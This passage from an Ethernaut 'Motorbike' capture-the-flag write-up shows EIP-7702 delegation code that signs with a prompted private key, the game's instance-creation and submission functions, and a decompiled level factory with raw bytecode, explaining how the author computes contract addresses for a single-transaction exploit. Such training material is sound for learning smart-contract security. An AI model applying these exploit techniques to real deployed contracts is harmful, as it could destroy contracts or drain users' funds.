        <span class="n">statistics</span><span class="p">.</span><span class="n">createNewInstance</span><span class="p">(</span><span class="n">instance</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">_level</span><span class="p">),</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">);</span>

        <span class="c1">// Retrieve created instance via logs.
</span>        <span class="k">emit</span> <span class="n">LevelInstanceCreatedLog</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">instance</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">_level</span><span class="p">));</span>
    <span class="p">}</span>
</code></pre></div></div><h2 id="delegating-to-the-sol-contract"> Delegating to the Sol contract <a href="#delegating-to-the-sol-contract">#</a></h2><div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Sol</span> <span class="n">sol</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Sol</span><span class="p">();</span>
<span class="kt">uint256</span> <span class="n">pk</span> <span class="o">=</span> <span class="kt">uint256</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">parseBytes32</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">promptSecret</span><span class="p">(</span><span class="s">"private key"</span><span class="p">)));</span>
<span class="n">vm</span><span class="p">.</span><span class="n">signAndAttachDelegation</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">sol</span><span class="p">),</span> <span class="n">pk</span><span class="p">);</span>
</code></pre></div></div><p>After deploying the Sol contract, I executed the <code class="language-plaintext highlighter-rouge">signAndAttachDelegation()</code> function using the private key.</p><p>The <code class="language-plaintext highlighter-rouge">signAndAttachDelegation()</code> function utilizes EIP-7702 features to sign an authorization, allowing the contract to be delegated to a wallet address.</p><p>I used this function specifically to address the requirements of <code class="language-plaintext highlighter-rouge">submitLevelInstance()</code>.</p><div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">function</span> <span class="n">submitLevelInstance</span><span class="p">(</span><span class="kt">address</span> <span class="k">payable</span> <span class="n">_instance</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
        <span class="c1">// Get player and level.
</span>        <span class="n">EmittedInstanceData</span> <span class="k">storage</span> <span class="n">data</span> <span class="o">=</span> <span class="n">emittedInstances</span><span class="p">[</span><span class="n">_instance</span><span class="p">];</span>
        <span class="nb">require</span><span class="p">(</span>
            <span class="n">data</span><span class="p">.</span><span class="n">player</span> <span class="o">==</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span>
            <span class="s">"This instance doesn't belong to the current user"</span>
        <span class="p">);</span> <span class="c1">// instance was emitted for this player
</span>        <span class="nb">require</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">completed</span> <span class="o">==</span> <span class="nb">false</span><span class="p">,</span> <span class="s">"Level has been completed already"</span><span class="p">);</span> <span class="c1">// not already submitted
</span>
        <span class="c1">// Have the level check the instance.
</span>        <span class="k">if</span> <span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">level</span><span class="p">.</span><span class="n">validateInstance</span><span class="p">(</span><span class="n">_instance</span><span class="p">,</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">))</span> <span class="p">{</span>
            <span class="c1">// Register instance as completed.
</span>            <span class="n">data</span><span class="p">.</span><span class="n">completed</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>

            <span class="n">statistics</span><span class="p">.</span><span class="n">submitSuccess</span><span class="p">(</span>
                <span class="n">_instance</span><span class="p">,</span>
                <span class="kt">address</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">level</span><span class="p">),</span>
                <span class="n">msg</span><span class="p">.</span><span class="n">sender</span>
            <span class="p">);</span>
            <span class="c1">// Notify success via logs.
</span>            <span class="k">emit</span> <span class="n">LevelCompletedLog</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">_instance</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">level</span><span class="p">));</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">statistics</span><span class="p">.</span><span class="n">submitFailure</span><span class="p">(</span>
                <span class="n">_instance</span><span class="p">,</span>
                <span class="kt">address</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">level</span><span class="p">),</span>
                <span class="n">msg</span><span class="p">.</span><span class="n">sender</span>
            <span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div><p>The <code class="language-plaintext highlighter-rouge">submitLevelInstance()</code> function, which is executed when the ‚ÄúSubmit instance‚Äù button is clicked, retrieves <code class="language-plaintext highlighter-rouge">emittedInstances[_instance]</code> to verify if the instance was registered by <code class="language-plaintext highlighter-rouge">msg.sender</code>.</p><p>This results in a failure when attempting to submit the solution to the Ethernaut site.</p><h2 id="obtaining-the-motorbike-and-engine-contract-addresses"> Obtaining the Motorbike and Engine Contract addresses <a href="#obtaining-the-motorbike-and-engine-contract-addresses">#</a></h2><p>The following outlines the process of determining the Motorbike and Engine Contract addresses.</p><p>Although the goal is to reduce the Engine Contract‚Äôs code size to 0, the <code class="language-plaintext highlighter-rouge">createLevelInstance()</code> function:</p><div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">function</span> <span class="n">createLevelInstance</span><span class="p">(</span><span class="n">Level</span> <span class="n">_level</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
        <span class="c1">// Ensure level is registered.
</span>        <span class="nb">require</span><span class="p">(</span><span class="n">registeredLevels</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="n">_level</span><span class="p">)],</span> <span class="s">"This level doesn't exists"</span><span class="p">);</span>

        <span class="c1">// Get level factory to create an instance.
</span>        <span class="kt">address</span> <span class="n">instance</span> <span class="o">=</span> <span class="n">_level</span><span class="p">.</span><span class="n">createInstance</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">}(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">);</span>

        <span class="c1">// Store emitted instance relationship with player and level.
</span>        <span class="n">emittedInstances</span><span class="p">[</span><span class="n">instance</span><span class="p">]</span> <span class="o">=</span> <span class="n">EmittedInstanceData</span><span class="p">(</span>
            <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span>
            <span class="n">_level</span><span class="p">,</span>
            <span class="nb">false</span>
        <span class="p">);</span>

        <span class="n">statistics</span><span class="p">.</span><span class="n">createNewInstance</span><span class="p">(</span><span class="n">instance</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">_level</span><span class="p">),</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">);</span>

        <span class="c1">// Retrieve created instance via logs.
</span>        <span class="k">emit</span> <span class="n">LevelInstanceCreatedLog</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">instance</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">_level</span><span class="p">));</span>
    <span class="p">}</span>
</code></pre></div></div><p>does not return any values. Furthermore, since the exploit must occur within a single transaction, event logs are inaccessible, making it necessary to manually calculate the contract addresses.</p><p>As observed in the challenge and Level instance code:</p><div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Decompiled by library.dedaub.com
// 2026.01.17 06:27 UTC
// Compiled using the solidity compiler version 0.6.12
</span>
<span class="c1">// Data structures and variables inferred from the use of storage instructions
</span><span class="k">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">address</span><span class="p">)</span> <span class="n">_createInstance</span><span class="p">;</span> <span class="c1">// STORAGE[0x1]
</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">;</span> <span class="c1">// STORAGE[0x0] bytes 0 to 19
</span>
<span class="c1">// Events
</span><span class="n">OwnershipTransferred</span><span class="p">(</span><span class="kt">address</span><span class="p">,</span> <span class="kt">address</span><span class="p">);</span>

<span class="k">function</span> <span class="n">transferOwnership</span><span class="p">(</span><span class="kt">address</span> <span class="n">newOwner</span><span class="p">)</span> <span class="k">public</span> <span class="n">nonPayable</span> <span class="p">{</span> 
    <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">length</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">&gt;=</span> <span class="mi">32</span><span class="p">);</span>
    <span class="nb">require</span><span class="p">(</span><span class="n">_owner</span> <span class="o">==</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">Error</span><span class="p">(</span><span class="s">'Ownable: caller is not the owner'</span><span class="p">));</span>
    <span class="nb">require</span><span class="p">(</span><span class="n">newOwner</span><span class="p">,</span> <span class="n">Error</span><span class="p">(</span><span class="s">'Ownable: new owner is the zero address'</span><span class="p">));</span>
    <span class="k">emit</span> <span class="n">OwnershipTransferred</span><span class="p">(</span><span class="n">_owner</span><span class="p">,</span> <span class="n">newOwner</span><span class="p">);</span>
    <span class="n">_owner</span> <span class="o">=</span> <span class="n">newOwner</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="k">fallback</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span> 
    <span class="nb">revert</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">renounceOwnership</span><span class="p">()</span> <span class="k">public</span> <span class="n">nonPayable</span> <span class="p">{</span> 
    <span class="nb">require</span><span class="p">(</span><span class="n">_owner</span> <span class="o">==</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">Error</span><span class="p">(</span><span class="s">'Ownable: caller is not the owner'</span><span class="p">));</span>
    <span class="k">emit</span> <span class="n">OwnershipTransferred</span><span class="p">(</span><span class="n">_owner</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">_owner</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">createInstance</span><span class="p">(</span><span class="kt">address</span> <span class="n">_hub</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span> 
    <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">length</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">&gt;=</span> <span class="mi">32</span><span class="p">);</span>
    <span class="n">MEM</span><span class="p">[</span><span class="n">v220V0x8c</span><span class="p">.</span><span class="n">data</span><span class="o">:</span><span class="n">v220V0x8c</span><span class="p">.</span><span class="n">data</span> <span class="o">+</span> <span class="mi">1353</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x608060405234801561001057600080fd5b50610529806100206000396000f3fe60806040526004361061003f5760003560e01c80634f1ef28614610044578063564f6d71146100fc5780638129fc1c14610123578063af26974514610138575b600080fd5b6100fa6004803603604081101561005a57600080fd5b6001600160a01b03823516919081019060408101602082013564010000000081111561008557600080fd5b82018360208201111561009757600080fd5b803590602001918460018302840111640100000000831117156100b957600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600092019190915250929550610169945050505050565b005b34801561010857600080fd5b5061011161017f565b60408051918252519081900360200190f35b34801561012f57600080fd5b506100fa610185565b34801561014457600080fd5b5061014d61025c565b604080516001600160a01b039092168252519081900360200190f35b610171610271565b61017b82826102d8565b5050565b60015481565b600054610100900460ff168061019e575061019e6103e4565b806101ac575060005460ff16155b6101e75760405162461bcd60e51b815260040180806020018281038252602e815260200180610499602e913960400191505060405180910390fd5b600054610100900460ff16158015610212576000805460ff1961ff0019909116610100171660011790555b6103e8600155600080547fffffffffffffffffffff0000000000000000000000000000000000000000ffff163362010000021790558015610259576000805461ff00191690555b50565b6000546201000090046001600160a01b031681565b6000546201000090046001600160a01b031633146102d6576040805162461bcd60e51b815260206004820152600d60248201527f43616e2774207570677261646500000000000000000000000000000000000000604482015290519081900360640190fd5b565b6102e1826103f5565b80511561017b576000826001600160a01b0316826040518082805190602001908083835b602083106103245780518252601f199092019160209182019101610305565b6001836020036101000a038019825116818451168082178552505050505050905001915050600060405180830381855af49150503d8060008114610384576040519150601f19603f3d011682016040523d82523d6000602084013e610389565b606091505b50509050806103df576040805162461bcd60e51b815260206004820152600b60248201527f43616c6c206661696c6564000000000000000000000000000000000000000000604482015290519081900360640190fd5b505050565b60006103ef30610492565b15905090565b6103fe81610492565b6104395760405162461bcd60e51b815260040180806020018281038252602d8152602001806104c7602d913960400191505060405180910390fd5b7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc80547fffffffffffffffffffffffff0000000000000000000000000000000000000000166001600160a01b0392909216919091179055565b3b15159056fe496e697469616c697a61626c653a20636f6e747261637420697320616c726561647920696e697469616c697a6564455243313936373a206e657720696d706c656d656e746174696f6e206973206e6f74206120636f6e7472616374a264697066735822122007424dee2c3970da4b44a842c5d8a06a97751da3c8c268eeecaa2569e32a9f3964736f6c634300060c0033</span><span class="p">;</span>
    <span class="n">v0</span> <span class="o">=</span> <span class="n">create</span><span class="p">.</span><span class="n">code</span><span class="p">(</span><span class="n">v1</span><span class="p">.</span><span class="n">data</span><span class="p">,</span> <span class="mi">1353</span><span class="p">).</span><span class="n">value</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="kt">bool</span><span class="p">(</span><span class="n">v0</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">MEM</span><span class="p">[</span><span class="n">v24eV0x8c</span><span class="p">.</span><span class="n">data</span><span class="o">:</span><span class="n">v24eV0x8c</span><span class="p">.</span><span class="n">data</span> <span class="o">+</span> <span class="mi">705</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x608060405234801561001057600080fd5b506040516102c13803806102c18339818101604052602081101561003357600080fd5b5051610049816101d1602090811b61007017901c565b6100845760405162461bcd60e51b815260040180806020018281038252602d815260200180610294602d913960400191505060405180910390fd5b806100ae7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc6101d7565b80546001600160a01b039283166001600160a01b031990911617905560408051600481526024810182526020810180516001600160e01b031663204a7f0760e21b1781529151815160009486169382918083835b602083106101215780518252601f199092019160209182019101610102565b6001836020036101000a038019825116818451168082178552505050505050905001915050600060405180830381855af49150503d8060008114610181576040519150601f19603f3d011682016040523d82523d6000602084013e610186565b606091505b50509050806101ca576040805162461bcd60e51b815260206004820152600b60248201526a10d85b1b0819985a5b195960aa1b604482015290519081900360640190fd5b50506101da565b3b151590565b90565b60ac806101e86000396000f3fe60806040526048602d7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc604a565b5473ffffffffffffffffffffffffffffffffffffffff16604d565b005b90565b3660008037600080366000845af43d6000803e808015606b573d6000f35b3d6000fd5b3b15159056fea2646970667358221220ca7b336654cd29640f3df95da5dc17f0facf369b8d4692675b71665674d682be64736f6c634300060c0033455243313936373a206e657720696d706c656d656e746174696f6e206973206e6f74206120636f6e7472616374</span><span class="p">;</span>
        <span class="n">v2</span> <span class="o">=</span> <span class="n">create</span><span class="p">.</span><span class="n">code</span><span class="p">(</span><span class="n">v3</span><span class="p">.</span><span class="n">data</span><span class="p">,</span> <span class="mi">737</span><span class="p">).</span><span class="n">value</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="kt">bool</span><span class="p">(</span><span class="n">v2</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">_createInstance</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="n">v2</span><span class="p">)]</span> <span class="o">=</span> <span class="n">v0</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">this</span><span class="p">.</span><span class="nb">balance</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="kt">bool</span><span class="p">(</span><span class="n">v2</span><span class="p">.</span><span class="n">code</span><span class="p">.</span><span class="n">size</span><span class="p">))</span> <span class="p">{</span>
                    <span class="n">v4</span> <span class="o">=</span> <span class="n">v5</span> <span class="o">=</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
                    <span class="n">v6</span> <span class="o">=</span> <span class="n">v7</span> <span class="o">=</span> <span class="mi">96</span> <span class="o">+</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
                    <span class="k">while</span> <span class="p">(</span><span class="n">v8</span> <span class="o">&gt;=</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">MEM</span><span class="p">[</span><span class="n">v4</span><span class="p">]</span> <span class="o">=</span> <span class="n">MEM</span><span class="p">[</span><span class="n">v6</span><span class="p">];</span>
                        <span class="n">v8</span> <span class="o">=</span> <span class="n">v8</span> <span class="o">-</span> <span class="mi">32</span><span class="p">;</span>
                        <span class="n">v4</span> <span class="o">+=</span> <span class="mi">32</span><span class="p">;</span>
                        <span class="n">v6</span> <span class="o">+=</span> <span class="mi">32</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="n">MEM</span><span class="p">[</span><span class="n">v4</span><span class="p">]</span> <span class="o">=</span> <span class="n">MEM</span><span class="p">[</span><span class="n">v6</span><span class="p">]</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">((</span><span class="kt">uint8</span><span class="p">.</span><span class="n">max</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">**</span> <span class="p">(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">v8</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="n">MEM</span><span class="p">[</span><span class="n">v4</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="kt">uint8</span><span class="p">.</span><span class="n">max</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">**</span> <span class="p">(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">v8</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
                    <span class="n">v9</span><span class="p">,</span> <span class="cm">/* uint256 */</span> <span class="n">v10</span><span class="p">,</span> <span class="cm">/* uint256 */</span> <span class="n">v11</span><span class="p">,</span> <span class="cm">/* uint256 */</span> <span class="n">v12</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">v2</span><span class="p">).</span><span class="n">upgrader</span><span class="p">().</span><span class="n">gas</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">gas</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">RETURNDATASIZE</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">v13</span> <span class="o">=</span> <span class="n">v14</span> <span class="o">=</span> <span class="mi">96</span><span class="p">;</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="n">v13</span> <span class="o">=</span> <span class="n">v15</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes</span><span class="p">[](</span><span class="n">RETURNDATASIZE</span><span class="p">());</span>
                        <span class="n">RETURNDATACOPY</span><span class="p">(</span><span class="n">v15</span><span class="p">.</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">RETURNDATASIZE</span><span class="p">());</span>
                    <span class="p">}</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">v9</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">MEM</span><span class="p">[</span><span class="n">v13</span><span class="p">],</span> <span class="n">v12</span><span class="p">,</span> <span class="n">MEM</span><span class="p">[</span><span class="n">v13</span><span class="p">]);</span>
                        <span class="n">v16</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes</span><span class="p">[](</span><span class="n">v17</span><span class="p">.</span><span class="n">length</span><span class="p">);</span>
                        <span class="n">v18</span> <span class="o">=</span> <span class="n">v19</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                        <span class="k">while</span> <span class="p">(</span><span class="n">v18</span> <span class="o">&lt;</span> <span class="n">v17</span><span class="p">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
                            <span class="n">v16</span><span class="p">[</span><span class="n">v18</span><span class="p">]</span> <span class="o">=</span> <span class="n">v17</span><span class="p">[</span><span class="n">v18</span><span class="p">];</span>
                            <span class="n">v18</span> <span class="o">+=</span> <span class="mi">32</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="k">if</span> <span class="p">(</span><span class="mi">30</span><span class="p">)</span> <span class="p">{</span>
                            <span class="n">MEM</span><span class="p">[</span><span class="n">v16</span><span class="p">.</span><span class="n">data</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes30</span><span class="p">(</span><span class="s">'Address: low-level call failed'</span><span class="p">);</span>
                        <span class="p">}</span>
                        <span class="nb">revert</span><span class="p">(</span><span class="n">Error</span><span class="p">(</span><span class="n">v16</span><span class="p">));</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="nb">require</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="n">MEM</span><span class="p">[</span><span class="mi">32</span> <span class="o">+</span> <span class="n">v784_0x1V0x62cV0x5e4V0x284V0x8c</span><span class="o">:</span><span class="mi">32</span> <span class="o">+</span> <span class="n">v784_0x1V0x62cV0x5e4V0x284V0x8c</span> <span class="o">+</span> <span class="n">MEM</span><span class="p">[</span><span class="n">v784_0x1V0x62cV0x5e4V0x284V0x8c</span><span class="p">]])</span> <span class="o">==</span> <span class="nb">keccak256</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">Error</span><span class="p">(</span><span class="s">'Wrong upgrader address'</span><span class="p">));</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nb">this</span><span class="p">.</span><span class="nb">balance</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                            <span class="k">if</span> <span class="p">(</span><span class="kt">bool</span><span class="p">(</span><span class="n">v2</span><span class="p">.</span><span class="n">code</span><span class="p">.</span><span class="n">size</span><span class="p">))</span> <span class="p">{</span>
                                <span class="n">v20</span> <span class="o">=</span> <span class="n">v21</span> <span class="o">=</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
                                <span class="n">v22</span> <span class="o">=</span> <span class="n">v23</span> <span class="o">=</span> <span class="mi">96</span> <span class="o">+</span> <span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
                                <span class="k">while</span> <span class="p">(</span><span class="n">v24</span> <span class="o">&gt;=</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
                                    <span class="n">MEM</span><span class="p">[</span><span class="n">v20</span><span class="p">]</span> <span class="o">=</span> <span class="n">MEM</span><span class="p">[</span><span class="n">v22</span><span class="p">];</span>
                                    <span class="n">v24</span> <span class="o">=</span> <span class="n">v24</span> <span class="o">-</span> <span class="mi">32</span><span class="p">;</span>
                                    <span class="n">v20</span> <span class="o">+=</span> <span class="mi">32</span><span class="p">;</span>
                                    <span class="n">v22</span> <span class="o">+=</span> <span class="mi">32</span><span class="p">;</span>
                                <span class="p">}</span>
                                <span class="n">MEM</span><span class="p">[</span><span class="n">v20</span><span class="p">]</span> <span class="o">=</span> <span class="n">MEM</span><span class="p">[</span><span class="n">v22</span><span class="p">]</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">((</span><span class="kt">uint8</span><span class="p">.</span><span class="n">max</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">**</span> <span class="p">(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">v24</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="n">MEM</span><span class="p">[</span><span class="n">v20</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="kt">uint8</span><span class="p">.</span><span class="n">max</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">**</span> <span class="p">(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">v24</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
                                <span class="n">v25</span><span class="p">,</span> <span class="cm">/* uint256 */</span> <span class="n">v26</span><span class="p">,</span> <span class="cm">/* uint256 */</span> <span class="n">v27</span><span class="p">,</span> <span class="cm">/* uint256 */</span> <span class="n">v28</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">v2</span><span class="p">).</span><span class="nb">call</span><span class="p">(</span><span class="mh">0x564f6d7100000000000000000000000000000000000000000000000000000000</span> <span class="o">|</span> <span class="kt">uint224</span><span class="p">(</span><span class="n">MEM</span><span class="p">[</span><span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="mi">96</span><span class="p">])).</span><span class="n">gas</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">gas</span><span class="p">);</span>
                                <span class="k">if</span> <span class="p">(</span><span class="n">RETURNDATASIZE</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                                    <span class="n">v29</span> <span class="o">=</span> <span class="n">v30</span> <span class="o">=</span> <span class="mi">96</span><span class="p">;</span>
                                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                                    <span class="n">v29</span> <span class="o">=</span> <span class="n">v31</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes</span><span class="p">[](</span><span class="n">RETURNDATASIZE</span><span class="p">());</span>
                                    <span class="n">RETURNDATACOPY</span><span class="p">(</span><span class="n">v31</span><span class="p">.</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">RETURNDATASIZE</span><span class="p">());</span>
                                <span class="p">}</span>
                                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">v25</span><span class="p">)</span> <span class="p">{</span>
                                    <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">MEM</span><span class="p">[</span><span class="n">v29</span><span class="p">],</span> <span class="n">v28</span><span class="p">,</span> <span class="n">MEM</span><span class="p">[</span><span class="n">v29</span><span class="p">]);</span>
                                    <span class="n">v32</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes</span><span class="p">[](</span><span class="n">v33</span><span class="p">.</span><span class="n">length</span><span class="p">);</span>
                                    <span class="n">v34</span> <span class="o">=</span> <span class="n">v35</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                                    <span class="k">while</span> <span class="p">(</span><span class="n">v34</span> <span class="o">&lt;</span> <span class="n">v33</span><span class="p">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
                                        <span class="n">v32</span><span class="p">[</span><span class="n">v34</span><span class="p">]</span> <span class="o">=</span> <span class="n">v33</span><span class="p">[</span><span class="n">v34</span><span class="p">];</span>
                                        <span class="n">v34</span> <span class="o">+=</span> <span class="mi">32</span><span class="p">;</span>
                                    <span class="p">}</span>
                                    <span class="k">if</span> <span class="p">(</span><span class="mi">30</span><span class="p">)</span> <span class="p">{</span>
                                        <span class="n">MEM</span><span class="p">[</span><span class="n">v32</span><span class="p">.</span><span class="n">data</span><span class="p">]</span> <span class="o">=</span> <span class="kt">bytes30</span><span class="p">(</span><span class="s">'Address: low-level call failed'</span><span class="p">);</span>
                                    <span class="p">}</span>
                                    <span class="nb">revert</span><span class="p">(</span><span class="n">Error</span><span class="p">(</span><span class="n">v32</span><span class="p">));</span>
                                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                                    <span class="nb">require</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="n">MEM</span><span class="p">[</span><span class="mi">32</span> <span class="o">+</span> <span class="n">v784_0x1V0x62cV0x5e4V0x39dV0x8c</span><span class="o">:</span><span class="mi">32</span> <span class="o">+</span> <span class="n">v784_0x1V0x62cV0x5e4V0x39dV0x8c</span> <span class="o">+</span> <span class="n">MEM</span><span class="p">[</span><span class="n">v784_0x1V0x62cV0x5e4V0x39dV0x8c</span><span class="p">]])</span> <span class="o">==</span> <span class="nb">keccak256</span><span class="p">(</span><span class="mi">1000</span><span class="p">),</span> <span class="n">Error</span><span class="p">(</span><span class="s">'Wrong horsePower'</span><span class="p">));</span>
                                    <span class="k">return</span> <span class="kt">address</span><span class="p">(</span><span class="n">v2</span><span class="p">);</span>
                                <span class="p">}</span>
                            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                                <span class="n">MEM</span><span class="p">[</span><span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]]</span> <span class="o">=</span> <span class="mh">0x8c379a000000000000000000000000000000000000000000000000000000000</span><span class="p">;</span>
                                <span class="n">MEM</span><span class="p">[</span><span class="n">MEM</span><span class="p">[</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">32</span><span class="p">;</span>
                                <span class="nb">revert</span><span class="p">(</span><span class="n">Error</span><span class="p">(</span><span class="s">'Address: call to non-contract'</span><span class="p">));</span>
                            <span class="p">}</span>
                        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
